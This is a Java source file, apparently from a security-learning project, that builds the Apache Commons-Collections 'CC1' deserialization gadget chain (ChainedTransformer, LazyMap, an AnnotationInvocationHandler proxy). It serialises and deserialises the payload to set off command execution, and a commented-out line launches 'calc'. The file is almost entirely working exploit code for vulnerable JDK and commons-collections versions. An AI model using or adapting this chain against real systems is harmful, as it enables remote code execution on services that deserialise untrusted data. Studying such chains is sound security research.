package com.pacemrc.javasec.deserialize.ysoserial;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import com.pacemrc.javasec.utils.*;

import static com.pacemrc.javasec.deserialize.ysoserial.Sinks.getTransformerArraySink;

/**
 * reference
 * https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.999.0.0&vd_source=12fd51019b9ffc7fda3230e04dc3b344
 */

/**
 * CC1链需JDK版本低于8u71,commons-collections包的版本小于3.2.2
 */
public class CC1 {

    public static void main(String[] args) throws Exception {

        //通过invokerTransfoemer执行命令
//        Runtime r = Runtime.getRuntime();
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
        //通过CC1调用链执行命令
        Transformer[] transformers = getTransformerArraySink();
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //第一条链
//        HashMap<Object, Object> map = new HashMap<>();
//        map.put("value","value");
//        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
//
//        Class clz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor constructor = clz.getDeclaredConstructor(Class.class, Map.class);
//        constructor.setAccessible(true);
//        Object o = constructor.newInstance(Target.class,transformedMap);

        //第二条链
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);

        Class clz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        Map mapProxy =  (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler);
        Object o = constructor.newInstance(Override.class, mapProxy);


        Deserialize.doSerialAndDeserial(o);
    }

}
